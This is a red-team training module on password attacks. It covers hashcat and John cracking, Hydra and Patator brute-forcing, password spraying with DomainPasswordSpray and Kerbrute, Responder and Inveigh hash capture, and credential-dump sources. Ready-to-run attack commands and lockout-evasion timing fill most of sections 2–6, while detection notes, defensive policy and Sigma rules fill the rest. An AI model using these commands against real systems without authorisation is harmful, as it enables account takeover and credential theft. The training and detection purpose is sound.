# Password Attacks, Credential Harvesting & Authentication Bypass

`[MODE: RED]` | CIPHER Training Module | 2026-03-14

---

## Table of Contents

1. [Hashcat Mode Reference — 30 Most Common Hash Types](#1-hashcat-mode-reference)
2. [Rule-Based Attack Methodology](#2-rule-based-attack-methodology)
3. [Wordlist Generation Strategies](#3-wordlist-generation-strategies)
4. [Online vs Offline Attack Comparison](#4-online-vs-offline-attack-comparison)
5. [Password Spraying Methodology](#5-password-spraying-methodology)
6. [Hash Capture Techniques](#6-hash-capture-techniques)
7. [Defensive Password Policy Recommendations](#7-defensive-password-policy-recommendations)

---

## 1. Hashcat Mode Reference

### The 30 Most Common Hash Types in Engagements

| Mode | Hash Type | Context | Speed Class |
|------|-----------|---------|-------------|
| `0` | MD5 | Web apps, legacy databases | Ultra-fast |
| `100` | SHA1 | Web apps, Git, legacy auth | Ultra-fast |
| `1400` | SHA2-256 | Modern web apps, tokens | Fast |
| `1700` | SHA2-512 | Modern web apps, tokens | Fast |
| `3` | LM | Legacy Windows (<Vista) | Ultra-fast |
| `1000` | NTLM | Windows SAM, AD, DCSync | Ultra-fast |
| `5500` | NetNTLMv1 | Network capture (Responder) | Fast |
| `5600` | NetNTLMv2 | Network capture (Responder) | Moderate |
| `13100` | Kerberos 5 TGS-REP (etype 23) | Kerberoasting | Moderate |
| `18200` | Kerberos 5 AS-REP (etype 23) | AS-REP roasting | Moderate |
| `3200` | bcrypt $2*$ | Modern web apps (Django, Rails) | Ultra-slow |
| `1800` | sha512crypt $6$ | Linux /etc/shadow | Very slow |
| `500` | md5crypt $1$ | Legacy Linux /etc/shadow | Slow |
| `7400` | sha256crypt $5$ | Linux /etc/shadow | Very slow |
| `1500` | descrypt/DES | Ancient Unix systems | Fast |
| `1600` | Apache $apr1$ MD5 | Apache .htpasswd | Slow |
| `400` | phpass | WordPress, Joomla, phpBB | Slow |
| `7900` | Drupal7 | Drupal CMS | Very slow |
| `1100` | Domain Cached Credentials (DCC) | Windows cached logons | Fast |
| `2100` | Domain Cached Credentials 2 (DCC2) | Vista+ cached logons | Slow |
| `15300` | DPAPI masterkey v1 | Windows credential store | Slow |
| `300` | MySQL4.1/MySQL5 | MySQL databases | Ultra-fast |
| `1731` | MSSQL (2012, 2014) | Microsoft SQL Server | Fast |
| `3100` | Oracle H: Type (Oracle 7+) | Oracle databases | Fast |
| `9400` | MS Office 2007 | Encrypted Office docs | Slow |
| `9500` | MS Office 2010 | Encrypted Office docs | Slow |
| `9600` | MS Office 2013 | Encrypted Office docs | Very slow |
| `10400` | PDF 1.1-1.3 (Acrobat 2-4) | Encrypted PDFs | Fast |
| `13400` | KeePass 1/2 AES | Password managers | Very slow |
| `10900` | PBKDF2-HMAC-SHA256 | Various modern apps | Slow |

### Speed Class Legend

| Class | Approximate Rate (RTX 4090) | Implication |
|-------|------------------------------|-------------|
| Ultra-fast | > 100 GH/s | Full keyspace feasible for short passwords |
| Fast | 1-50 GH/s | Dictionary + rules highly effective |
| Moderate | 100 MH/s - 1 GH/s | Dictionary + targeted rules |
| Slow | 1-100 MH/s | Focus on targeted wordlists |
| Very slow | 10-500 KH/s | Only short lists, targeted attacks |
| Ultra-slow | < 10 KH/s | Highly targeted or known pattern only |

### Quick Identification Cheat Sheet

```
$1$...          -> 500   (md5crypt)
$2a$/$2b$...   -> 3200  (bcrypt)
$5$...          -> 7400  (sha256crypt)
$6$...          -> 1800  (sha512crypt)
$apr1$...       -> 1600  (Apache MD5)
$P$/$H$...     -> 400   (phpass/WordPress)
$S$...          -> 7900  (Drupal7)
$DCC2$...       -> 2100  (DCC2)
$krb5tgs$23$... -> 13100 (Kerberoasting)
$krb5asrep$23$. -> 18200 (AS-REP Roasting)
$office$*2007*  -> 9400  (MS Office 2007)
$keepass$...    -> 13400 (KeePass)
32 hex chars    -> 0 or 1000 (MD5 or NTLM — context determines)
40 hex chars    -> 100   (SHA1)
64 hex chars    -> 1400  (SHA256)
128 hex chars   -> 1700  (SHA512)
```

**[CONFIRMED]** — Mode numbers sourced from hashcat.net/wiki example_hashes.

---

## 2. Rule-Based Attack Methodology

### What Are Rules?

Rules transform dictionary words at runtime — appending digits, toggling case, substituting characters, reversing strings — without pre-generating the entire candidate keyspace. This multiplies dictionary effectiveness by orders of magnitude.

### Core Hashcat Rule Syntax

| Function | Syntax | Example | Effect |
|----------|--------|---------|--------|
| Lowercase all | `l` | `Password` -> `password` | |
| Uppercase all | `u` | `password` -> `PASSWORD` | |
| Capitalize | `c` | `password` -> `Password` | |
| Toggle case at N | `TN` | `T3` on `password` -> `pasSwOrd` | |
| Append char | `$X` | `$1` on `pass` -> `pass1` | |
| Prepend char | `^X` | `^!` on `pass` -> `!pass` | |
| Duplicate word | `d` | `pass` -> `passpass` | |
| Reverse | `r` | `pass` -> `ssap` | |
| Rotate left | `{` | `pass` -> `assp` | |
| Substitute | `sXY` | `sa@` on `password` -> `p@ssword` | |
| Delete at N | `DN` | `D0` on `pass` -> `ass` | |
| Insert at N | `iNX` | `i4!` on `pass` -> `pass!` | |
| Truncate at N | `'N` | `'4` on `password` -> `pass` | |

### Rule Chaining

Multiple functions per line execute sequentially:

```
# Capitalize + append "2024!"
c $2 $0 $2 $4 $!

# Leet speak substitution chain
sa@ se3 si1 so0 ss$

# Capitalize + append two digits
c $0 $1
c $1 $2
c $2 $3
...
```

### Key Rule Files — Ranked by Effectiveness

| Rule Set | File | Rules Count | Use Case |
|----------|------|-------------|----------|
| **OneRuleToRuleThemAll** | `OneRuleToRuleThemAll.rule` | ~52,000 | Best general-purpose; combined from Hob0Rules, KoreLogic, NSA, hashcat generated2 |
| **Hob0Rules d3adhob0** | `d3adhob0.rule` | ~18,000 | Comprehensive; statistical analysis of real password patterns |
| **Hob0Rules hob064** | `hob064.rule` | 64 | Quick wins; 64 most frequent password transforms |
| **best64.rule** | (hashcat built-in) | 64 | Hashcat default; fast initial pass |
| **dive.rule** | (hashcat built-in) | ~99,000 | Exhaustive; long runtime |
| **generated2.rule** | (hashcat built-in) | ~65,000 | Machine-generated rules |

### Recommended Attack Sequence

```bash
# Phase 1: Quick wins (minutes)
hashcat -m <mode> hashes.txt wordlist.txt -r best64.rule

# Phase 2: Focused statistical rules (tens of minutes)
hashcat -m <mode> hashes.txt wordlist.txt -r hob064.rule

# Phase 3: Comprehensive (hours)
hashcat -m <mode> hashes.txt wordlist.txt -r OneRuleToRuleThemAll.rule

# Phase 4: Deep dive (overnight)
hashcat -m <mode> hashes.txt wordlist.txt -r d3adhob0.rule

# Phase 5: Brute-force remaining (mask attack)
hashcat -m <mode> hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?s
```

### Rule Generation

```bash
# Generate rules from cracked passwords vs wordlist
hashcat --stdout wordlist.txt -r best64.rule | sort -u > expanded.txt

# Random rule generation (useful for novel patterns)
hashcat -m <mode> hashes.txt wordlist.txt -g 50000
```

**DETECTION OPPORTUNITIES:** Rule-based cracking is offline — no network indicators. Detect the precursors: hash exfiltration (DCSync, SAM dump, LSASS access, shadow file read).

---

## 3. Wordlist Generation Strategies

### Tiered Wordlist Approach

```
Tier 1: Targeted (fastest)
  |-> CUPP profiles, CeWL site scraping, OSINT-derived terms
  |-> Company name variations, internal jargon, project names

Tier 2: Statistical (fast)
  |-> Probable-Wordlists (frequency-sorted, real passwords)
  |-> Top 1M, 10M from SecLists

Tier 3: Comprehensive (slow)
  |-> rockyou.txt (14M passwords)
  |-> SecLists full password collections
  |-> Weakpass combined lists

Tier 4: Exhaustive (very slow)
  |-> Full breach compilations
  |-> Mask attacks / brute-force
```

### Tool-Specific Strategies

#### CeWL — Website-Derived Wordlists

Spider a target's public web presence to extract terminology likely used in passwords:

```bash
# Basic: depth 3, min 5 chars, with email harvest
cewl -d 3 -m 5 -e -w target_words.txt https://target.com

# With metadata extraction from documents
cewl -d 2 -m 4 --meta -w meta_words.txt https://target.com

# Follow external links for broader coverage
cewl -d 2 -m 5 --offsite -w broad_words.txt https://target.com

# With authentication
cewl -d 2 -m 5 --auth_type digest --auth_user admin \
     --auth_pass password -w auth_words.txt https://target.com
```

**CeWL output enrichment:**
```bash
# Take CeWL output and apply rules for candidate generation
hashcat --stdout cewl_output.txt -r best64.rule | sort -u > cewl_expanded.txt
```

#### CUPP — Target-Profiled Wordlists

Generate passwords from biographical data (names, birthdays, pets, partners):

```bash
# Interactive profiling mode
python3 cupp.py -i
# Prompts for: first name, surname, nickname, birthdate,
# partner's info, child's info, pet name, company name,
# keywords, special chars, leet mode, random numbers

# Enhance existing wordlist with profiling
python3 cupp.py -w existing_wordlist.txt

# Download default credential lists (Alecto database)
python3 cupp.py -a
```

**Profiling sources for CUPP input:**
- LinkedIn profiles (job titles, company, education)
- Social media (pet names, children, hobbies, sports teams)
- Public records (addresses, phone numbers)
- Company "about" pages (founding year, founder names)

#### Mentalist — Visual Rule Chain Builder

GUI tool for building transformation chains:

1. Select base words (dictionary, CeWL output, custom list)
2. Add transformation nodes: case changes, substitutions, appends, prepends
3. Chain multiple transformations
4. Export as: raw wordlist, hashcat rules, or John rules

#### SecLists — Curated Password Collections

Key password files within SecLists:

```
Passwords/
  Common-Credentials/
    10-million-password-list-top-1000000.txt
    best1050.txt
    top-passwords-shortlist.txt
  Leaked-Databases/
    rockyou.txt.tar.gz
  Default-Credentials/
    default-passwords.csv
  Honeypot-Captures/
  WiFi-WPA/
```

#### Probable-Wordlists — Frequency-Sorted

~2 billion passwords sorted by real-world frequency (not alphabetically). Compiled from 1,600+ breach files, filtered to passwords appearing in 5+ sources.

Key lists:
- `Real-Passwords/Top304Thousand-probable-v2.txt` — highest probability
- `Real-Passwords/Top1pt6Million-probable-v2.txt`
- `Real-Passwords/Top12Thousand-probable-v2.txt` — spray candidate
- WPA-length variants (8-63 chars) for WiFi attacks

### Wordlist Combination Strategy

```bash
# Combine targeted + statistical for focused attack
cat cewl_output.txt cupp_output.txt company_terms.txt > targeted.txt
sort -u targeted.txt -o targeted.txt

# Use combinator attack (two wordlists concatenated)
hashcat -m <mode> hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Hybrid: wordlist + mask
hashcat -m <mode> hashes.txt -a 6 wordlist.txt ?d?d?d?d    # word + 4 digits
hashcat -m <mode> hashes.txt -a 7 ?u wordlist.txt           # uppercase + word

# Prince attack (generates candidates from wordlist element combinations)
hashcat -m <mode> hashes.txt wordlist.txt --prince
```

---

## 4. Online vs Offline Attack Comparison

### Fundamental Differences

| Attribute | Offline Attack | Online Attack |
|-----------|---------------|---------------|
| **Target** | Captured hash/encrypted data | Live service (SSH, HTTP, SMB, etc.) |
| **Speed** | Billions/sec (GPU) | 1-1000/sec (network-bound) |
| **Detection risk** | None (local computation) | High (auth logs, IDS/IPS, lockout) |
| **Lockout risk** | None | Critical |
| **Tools** | Hashcat, John the Ripper | Hydra, Patator, Kerbrute, custom |
| **Prerequisites** | Hash extraction (dump, capture, file) | Network access to service |
| **Success factors** | GPU power, wordlist quality, hash type | Timing, lockout policy, wordlist |

### Offline Attack Tools

#### Hashcat — GPU-Accelerated Cracking

```bash
# Dictionary attack
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Dictionary + rules
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# Mask attack (brute-force with pattern)
hashcat -m 1000 ntlm_hashes.txt -a 3 ?u?l?l?l?l?l?d?d

# Combinator attack
hashcat -m 1000 ntlm_hashes.txt -a 1 words1.txt words2.txt

# Hybrid: dict + mask
hashcat -m 1000 ntlm_hashes.txt -a 6 words.txt ?d?d?d?d

# Show cracked passwords
hashcat -m 1000 ntlm_hashes.txt --show

# Session management
hashcat -m 1000 ntlm_hashes.txt rockyou.txt --session=engagement1
hashcat --restore --session=engagement1
```

**Hashcat attack modes:**

| Mode | Name | Description |
|------|------|-------------|
| `-a 0` | Straight/Dictionary | Wordlist with optional rules |
| `-a 1` | Combinator | Concatenates two wordlists |
| `-a 3` | Brute-Force/Mask | Pattern-based generation |
| `-a 6` | Hybrid Dict+Mask | Wordlist + appended mask |
| `-a 7` | Hybrid Mask+Dict | Prepended mask + wordlist |
| `-a 9` | Association | Maps candidates to specific hashes |

#### John the Ripper — Versatile Cracker

```bash
# Auto-detect hash type
john hashes.txt

# Specify format
john --format=NT hashes.txt

# Wordlist with rules
john --wordlist=rockyou.txt --rules hashes.txt

# Incremental (brute-force)
john --incremental hashes.txt

# Show cracked
john --show hashes.txt
```

**Key *2john utilities for hash extraction:**

| Utility | Extracts from |
|---------|--------------|
| `zip2john` | ZIP archives |
| `rar2john` | RAR archives |
| `pdf2john` | PDF files |
| `office2john` | MS Office docs |
| `ssh2john` | SSH private keys |
| `keepass2john` | KeePass databases |
| `bitlocker2john` | BitLocker volumes |
| `gpg2john` | GPG/PGP keys |
| `pfx2john` | PKCS#12 certificates |
| `wpapcap2john` | WPA handshake captures |

### Online Attack Tools

#### THC Hydra — Parallel Login Cracker

Supports 50+ protocols: SSH, FTP, HTTP-GET/POST/FORM, RDP, SMB, MySQL, PostgreSQL, MSSQL, Oracle, LDAP, SMTP, POP3, IMAP, VNC, Telnet, Cisco, SAP, SIP, and more.

```bash
# SSH brute-force
hydra -l admin -P passwords.txt ssh://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# SMB with threading
hydra -L users.txt -P passwords.txt smb://192.168.1.1 -t 4

# RDP (careful with lockout)
hydra -l administrator -P passwords.txt rdp://192.168.1.1 -t 1

# FTP with resume
hydra -L users.txt -P passwords.txt ftp://192.168.1.1 -o results.txt
```

**Timing reference:** 295 credentials against FTP — 45 minutes single-threaded vs 29 seconds at `-t 100`. However, high thread counts destabilize targets and trigger detection.

#### Patator — Modular Brute-Forcer

More reliable and flexible than Hydra for complex scenarios:

```bash
# SSH login
patator ssh_login host=192.168.1.1 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'

# HTTP form brute-force
patator http_fuzz url=https://target/login method=POST \
  body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt \
  -x ignore:fgrep='Invalid'

# SMB login
patator smb_login host=192.168.1.1 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt

# ZIP password
patator unzip_pass zipfile=target.zip password=FILE0 0=passwords.txt
```

**Patator advantages over Hydra:**
- Better error handling and retry logic
- More granular response filtering (`-x ignore`, `-x retry`, `-x reset`)
- Cleaner output with response codes and timing
- Docker support for isolation

### When to Use Which

```
Hash available?
  YES -> Offline (Hashcat/John) — always preferred
  NO  -> Can you capture a hash? (Responder, relay, dump)
    YES -> Capture, then offline
    NO  -> Online attack (last resort)
         -> Password spray preferred over brute-force
         -> Single account brute-force = highest risk
```

---

## 5. Password Spraying Methodology

### Concept

Password spraying inverts the brute-force model: instead of many passwords against one account, spray one password against many accounts. This stays below lockout thresholds while exploiting the statistical certainty that some users will have weak passwords.

### Pre-Spray Reconnaissance

```
1. Enumerate password policy
   - Lockout threshold (e.g., 5 attempts)
   - Lockout observation window (e.g., 30 minutes)
   - Lockout duration (e.g., 30 minutes)
   - Complexity requirements
   - Minimum length
   - Password history

2. Enumerate users
   - LDAP queries (if authenticated)
   - Kerberos user enumeration (kerbrute — stealthier)
   - OWA/O365 enumeration
   - LinkedIn/OSINT employee harvesting

3. Build password candidates
   - Season+Year: Spring2026, Winter2025!
   - Company+digits: Acme2026!, AcmeCorp1
   - Month+Year: March2026!, Mar2026
   - Welcome+digits: Welcome1!, Welcome2026
   - Password policy minimum: if 8 char min, test 8-char patterns
```

### Timing and Lockout Avoidance

**Critical formula:**

```
Spray interval >= Lockout observation window
Attempts per window < Lockout threshold - 1 (safety margin)

Example:
  Lockout threshold: 5 attempts
  Observation window: 30 minutes
  -> Spray 1 password every 30 minutes (3 max to leave margin)
```

**Timing patterns:**

| Scenario | Lockout Threshold | Window | Safe Interval |
|----------|------------------|--------|---------------|
| Strict | 3 attempts | 30 min | 1 password / 35 min |
| Standard | 5 attempts | 30 min | 1 password / 32 min |
| Lenient | 10 attempts | 15 min | 2 passwords / 20 min |
| No lockout | Unlimited | N/A | Throttle for stealth only |

**Warning:** Some organizations use cumulative lockout counters that do not reset until manual unlock. Always verify policy before spraying.

### Tool-Specific Spray Techniques

#### DomainPasswordSpray (PowerShell — AD Joined)

```powershell
# Import
Import-Module .\DomainPasswordSpray.ps1

# Basic spray (auto-enumerates users, auto-detects lockout window)
Invoke-DomainPasswordSpray -Password "Spring2026!"

# With specific user list
Invoke-DomainPasswordSpray -UserList .\users.txt -Password "Welcome1!"

# Multiple passwords (automatically waits between attempts)
Invoke-DomainPasswordSpray -PasswordList .\spray_passwords.txt -OutFile results.txt

# Exclude accounts near lockout
Invoke-DomainPasswordSpray -Password "Company2026!" -Force
```

**Key feature:** Automatically detects domain lockout observation window and throttles spray attempts accordingly.

#### Kerbrute (Kerberos Pre-Auth — Stealthier)

```bash
# User enumeration (no failed logon events in default config)
./kerbrute userenum -d domain.com --dc 10.0.0.1 users.txt

# Password spray
./kerbrute passwordspray -d domain.com --dc 10.0.0.1 users.txt "Spring2026!"

# Safe mode (stops on lockout detection)
./kerbrute passwordspray -d domain.com --dc 10.0.0.1 users.txt "Welcome1!" --safe

# With delay (1 second between attempts)
./kerbrute passwordspray -d domain.com --dc 10.0.0.1 users.txt "P@ssw0rd" --delay 1000

# Brute-force single user
./kerbrute bruteuser -d domain.com --dc 10.0.0.1 passwords.txt jsmith
```

**Kerbrute stealth advantage:** Kerberos pre-auth failures generate Event ID 4768/4771, but NOT the traditional 4625 (failed logon) that many SIEM rules monitor. User enumeration via pre-auth does not increment the lockout counter at all.

#### Hydra — Protocol-Specific Spray

```bash
# HTTP Basic auth spray (single password, many users)
hydra -L users.txt -p "Spring2026!" https://target.com https-get /

# OWA spray
hydra -L users.txt -p "Company2026!" -s 443 mail.target.com https-post-form \
  "/owa/auth.owa:destination=https%3A%2F%2Fmail.target.com%2Fowa&username=^USER^&password=^PASS^:F=reason"

# SSH spray
hydra -L users.txt -p "Welcome1!" ssh://10.0.0.1 -t 1 -W 3
```

### Spray Password Selection Strategy

**Highest probability candidates (ordered):**

```
1. [Season][Year][!]           -> Spring2026!
2. [CompanyName][digits][!]    -> Acme2026!
3. [Month][Year][!]            -> March2026!
4. Welcome[1/123/!]            -> Welcome1!
5. Password[1/123/!]           -> Password1!
6. [CompanyName][Season/Year]  -> AcmeSpring
7. [City][digits]              -> Denver2026!
8. Changeme[1/123]             -> Changeme1
9. [SportTeam][digits]         -> Cowboys2026!
10. [Year][Season]!            -> 2026Spring!
```

**DETECTION OPPORTUNITIES:** Monitor for distributed authentication failures — same password across many accounts within a short window. Event IDs 4625 (NTLM), 4771 (Kerberos pre-auth failure). Alert on N+ distinct users failing auth within M minutes from same source IP.

---

## 6. Hash Capture Techniques

### Network-Based Hash Capture

#### Responder — LLMNR/NBT-NS/mDNS Poisoning

**How it works:** When Windows DNS resolution fails, the system falls back to broadcast protocols (LLMNR on port 5355, NBT-NS on port 137, mDNS on port 5353). Responder answers these broadcasts, impersonating the requested host, and forces the victim to authenticate to attacker-controlled rogue servers.

```bash
# Standard poisoning (captures NTLMv1/v2 from SMB, HTTP, etc.)
sudo responder -I eth0 -v

# Passive analysis mode (no poisoning, just listen)
sudo responder -I eth0 -A -v

# Force HTTP Basic auth (cleartext capture)
sudo responder -I eth0 -b -v

# With WPAD proxy auth + rogue DHCP
sudo responder -I eth0 -Pvd

# DHCPv6 poisoning (Windows 10/11)
sudo responder -I eth0 --dhcpv6 -v
```

**Responder rogue servers and captured credential types:**

| Server | Port(s) | Captures |
|--------|---------|----------|
| SMB | 445, 139 | NetNTLMv1 (mode 5500), NetNTLMv2 (mode 5600) |
| HTTP/HTTPS | 80, 443 | NTLM, Basic (cleartext), WPAD auth |
| MSSQL | 1433 | NTLM, SQL auth |
| FTP | 21 | Cleartext USER/PASS |
| SMTP | 25, 587 | Cleartext, NTLM |
| IMAP/IMAPS | 143, 993 | Cleartext, NTLM |
| POP3 | 110 | Cleartext |
| LDAP/LDAPS | 389, 636 | Cleartext, NTLM |
| Kerberos | 88 | AS-REQ (mode 7500) |

**Post-capture cracking:**

```bash
# NetNTLMv2 (most common capture)
hashcat -m 5600 responder_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# NetNTLMv1 (if captured — downgrade or legacy)
hashcat -m 5500 responder_hashes.txt rockyou.txt

# NetNTLMv1 with ntlmv1-multi conversion for DES cracking
python3 ntlmv1-multi.py -f responder_ntlmv1.txt
# Outputs DES pairs for hashcat mode 14000
hashcat -m 14000 des_pairs.txt -a 3 ?b?b?b?b?b?b?b?b
```

**Responder configuration (`Responder.conf`):**

```ini
[Responder Core]
; Control which servers are active
LLMNR   = On
NBTNS   = On
MDNS    = On
SMB     = On     ; NetNTLMv1/v2 capture
HTTP    = On     ; NTLM/Basic capture
HTTPS   = On
MSSQL   = On
FTP     = On     ; Cleartext capture
SMTP    = On
IMAP    = On
LDAP    = On
Kerberos = On    ; AS-REQ capture
```

#### Inveigh — Windows/.NET Alternative to Responder

Cross-platform .NET (C#) tool — ideal when running from a compromised Windows host:

```powershell
# PowerShell version (legacy, v1.506)
Import-Module .\Inveigh.psd1
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y

# C# version (current — compiled binary)
.\Inveigh.exe
```

**Inveigh capabilities:**
- LLMNR, DNS, mDNS, NBNS, DHCPv6 spoofing
- HTTP, HTTPS, SMB, LDAP, WebDAV listeners
- NTLMv1/v2 hash capture
- IPv4 and IPv6 support
- .NET 3.5/4.6.2/6.0 targets
- Packet sniffing (Windows only, raw sockets)

**Inveigh vs Responder:**

| Feature | Responder | Inveigh |
|---------|-----------|---------|
| Platform | Linux (primary) | Windows/.NET |
| Language | Python | C# / PowerShell |
| Use case | Attacker machine on network | Post-compromise from Windows host |
| IPv6 | DHCPv6 support | Full IPv6 |
| Evasion | N/A (attacker box) | Runs in-process, evades some EDR |

#### NTLMv1 Downgrade and Advanced Cracking

**ntlmv1-multi tool:**

When NTLMv1 hashes are captured (via Responder with `--lm` or against legacy clients), convert for efficient cracking:

```bash
# Convert NTLMv1 capture to DES format for hashcat mode 14000
python3 ntlmv1-multi.py -f ntlmv1_hashes.txt

# Output: three DES ciphertext:challenge pairs per hash
# Crack each with DES brute-force (feasible — 56-bit key)
hashcat -m 14000 ct1.txt -a 3 ?b?b?b?b?b?b?b?b
hashcat -m 14000 ct2.txt -a 3 ?b?b?b?b?b?b?b?b

# Combine recovered DES keys to reconstruct NTLM hash
python3 des_to_ntlm.py key1 key2 key3
```

**NTLMv1 with ESS (Extended Session Security):** The tool recalculates the modified challenge from client+server challenges, producing valid DES pairs despite ESS protections.

**crack.sh integration:** For NTLMv1 without SSP, submit to crack.sh — a rainbow table service that cracks DES in seconds using precomputed tables.

### Relay vs Crack Decision Matrix

```
NetNTLMv2 captured:
  -> Can you relay? (SMB signing disabled, target accessible)
    YES -> ntlmrelayx / impacket relay (instant access, no cracking)
    NO  -> Crack with hashcat -m 5600

NetNTLMv1 captured:
  -> Convert with ntlmv1-multi -> DES brute-force (always crackable)
  -> Or relay if conditions met

NTLM hash (from SAM/LSASS/DCSync):
  -> Pass-the-hash directly (no cracking needed for lateral movement)
  -> Crack for password reuse across non-Windows systems
```

### Other Hash Sources

| Source | Method | Hash Type | Hashcat Mode |
|--------|--------|-----------|-------------|
| SAM database | `reg save HKLM\SAM` / secretsdump | NTLM | 1000 |
| LSASS memory | mimikatz, procdump + pypykatz | NTLM / cleartext | 1000 |
| DCSync | secretsdump / mimikatz | NTLM | 1000 |
| NTDS.dit | ntdsutil, vssadmin + secretsdump | NTLM | 1000 |
| /etc/shadow | File read (root) | sha512crypt / md5crypt | 1800 / 500 |
| Cached creds | secretsdump / mimikatz | DCC2 | 2100 |
| Kerberoast | GetUserSPNs.py / Rubeus | TGS-REP etype 23 | 13100 |
| AS-REP Roast | GetNPUsers.py / Rubeus | AS-REP etype 23 | 18200 |
| WiFi handshake | aircrack-ng / hcxpcapngtool | WPA PBKDF2 | 22000 |
| Encrypted files | *2john utilities | Various | Various |

**DETECTION OPPORTUNITIES:**
- Responder: Monitor for LLMNR/NBT-NS responses from non-DNS servers. Detect duplicate mDNS responses. Deploy honey tokens that generate LLMNR queries to canary hostnames.
- NTLM relay: Enforce SMB signing. Monitor for NTLM auth to unexpected targets.
- Kerberoasting: Monitor Event ID 4769 with encryption type 0x17 (RC4) for service tickets requested by non-service accounts.
- DCSync: Monitor for DRS replication requests (Event ID 4662 with GUID `1131f6ad-...`) from non-DC sources.

---

## 7. Defensive Password Policy Recommendations

### Password Policy — Technical Controls

#### Minimum Requirements (NIST SP 800-63B Aligned)

| Control | Recommendation | Rationale |
|---------|---------------|-----------|
| **Minimum length** | 14+ characters (16+ preferred) | Length beats complexity; each char adds exponential keyspace |
| **Maximum length** | 128+ characters | Do not truncate; support passphrases |
| **Complexity rules** | Do NOT require upper/lower/digit/special | Drives predictable patterns (Password1!); NIST deprecated this |
| **Breached password check** | Block known-compromised passwords | Check against HaveIBeenPwned API / NTLM hash list on every set/change |
| **Dictionary check** | Block common words, company name, username | Prevents trivial dictionary attacks |
| **Rotation** | Do NOT force periodic rotation | NIST 800-63B: rotation without compromise evidence degrades password quality |
| **Password history** | 24+ remembered passwords | Prevents simple cycling |
| **Lockout threshold** | 10 attempts / 15-minute window | Balances spray defense with usability |
| **Lockout duration** | 15-30 minutes (auto-unlock) | Manual unlock creates DoS vector |

#### Hash Storage Requirements

| Algorithm | Status | Recommendation |
|-----------|--------|----------------|
| **Argon2id** | Best | Use with memory=64MB, iterations=3, parallelism=4 |
| **bcrypt** | Good | Work factor 12+ (adjust for <100ms hash time) |
| **scrypt** | Good | N=2^17, r=8, p=1 |
| **PBKDF2-SHA256** | Acceptable | 600,000+ iterations (OWASP 2023) |
| **SHA-256/512 + salt** | Weak | Fast hash; GPU-crackable |
| **MD5 / SHA1** | Unacceptable | Trivially crackable |
| **Unsalted anything** | Unacceptable | Rainbow table vulnerable |

### Network-Level Defenses

#### Against Hash Capture (Responder/Inveigh)

```
1. Disable LLMNR
   GPO: Computer Config > Admin Templates > Network > DNS Client
   -> "Turn OFF Multicast Name Resolution" = Enabled

2. Disable NBT-NS
   Network adapter > IPv4 Properties > Advanced > WINS
   -> "Disable NetBIOS over TCP/IP"
   Or via DHCP option 001 (0x01) = 0x02

3. Disable mDNS
   (Windows) Registry: HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters
   -> EnableMDNS = 0

4. Enforce SMB Signing
   GPO: Computer Config > Policies > Windows Settings > Security Settings
   -> "Microsoft network server: Digitally sign communications (always)" = Enabled
   -> "Microsoft network client: Digitally sign communications (always)" = Enabled

5. Disable WPAD
   GPO + DNS blackhole for wpad.<domain>
   Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad
   -> WpadOverride = 1

6. Network segmentation
   Limit broadcast domain size; VLANs reduce poisoning reach
```

#### Against Password Spraying

```
1. Smart lockout (Azure AD / Entra ID)
   - Locks out based on unfamiliar location + IP reputation
   - Does not lock out legitimate users at familiar locations

2. Conditional Access policies
   - Require MFA for all external auth
   - Block legacy auth protocols (no MFA support)
   - Geo-fencing for impossible travel

3. Monitoring and alerting
   - Alert: N+ distinct users failing auth within M minutes from same source
   - Alert: Successful auth after spray pattern detected
   - Correlate: 4625 (NTLM failure) + 4771 (Kerberos pre-auth failure)
   - Alert: Auth failures for disabled/non-existent accounts (enum indicator)

4. Authentication rate limiting
   - Progressive delays after failed attempts
   - CAPTCHA after 3+ failures
   - IP-based throttling at WAF/reverse proxy
```

#### Against Offline Cracking

```
1. Use slow hashing algorithms (Argon2id, bcrypt)
   - Makes GPU cracking infeasible for reasonable-length passwords
   - bcrypt with cost 12: ~3 KH/s on RTX 4090 (vs 100 GH/s for MD5)

2. Implement MFA everywhere
   - Cracked password alone insufficient for access
   - FIDO2/WebAuthn preferred (phishing-resistant)
   - TOTP acceptable, SMS MFA as last resort

3. Protect hash stores
   - Restrict SAM/LSASS access (Credential Guard, RunAsPPL)
   - Audit /etc/shadow permissions (mode 640, root:shadow)
   - Monitor NTDS.dit access and DRS replication
   - Encrypt database password columns at rest

4. Credential tiering
   - Tier 0 (DC admin) creds never on Tier 1/2 systems
   - Prevents lateral movement from workstation to domain admin
   - Implement PAWs (Privileged Access Workstations)
```

### Detection Engineering — Key Rules

#### Sigma Rule: Password Spray Detection

```yaml
title: Potential Password Spray - Multiple Users Failed Auth From Single Source
id: 7a4f6e2b-8c1d-4e3f-9a5b-2d7c8e4f1a6b
status: experimental
description: Detects multiple distinct accounts failing authentication from
  the same source within a short time window, indicating password spray activity.
logsource:
  category: authentication
  product: windows
detection:
  selection:
    EventID:
      - 4625
      - 4771
  timeframe: 15m
  condition: selection | count(TargetUserName) by IpAddress > 10
falsepositives:
  - Misconfigured service accounts cycling credentials
  - Vulnerability scanners with authentication modules
level: high
tags:
  - attack.t1110.003
  - attack.credential_access
```

#### Sigma Rule: LLMNR/NBT-NS Poisoning Detection

```yaml
title: LLMNR/NBT-NS Poisoning Response From Non-DNS Server
id: 3b5e7f1a-9d2c-4a8e-b6f3-1e4d7c9a2b5f
status: experimental
description: Detects LLMNR or NBT-NS responses originating from hosts that
  are not legitimate DNS servers, indicating potential poisoning by Responder
  or similar tools.
logsource:
  category: network_connection
  product: zeek
detection:
  selection_llmnr:
    dst_port: 5355
    protocol: udp
  selection_nbtns:
    dst_port: 137
    protocol: udp
  filter_dns_servers:
    src_ip:
      - '10.0.0.1'   # Replace with legitimate DNS
      - '10.0.0.2'
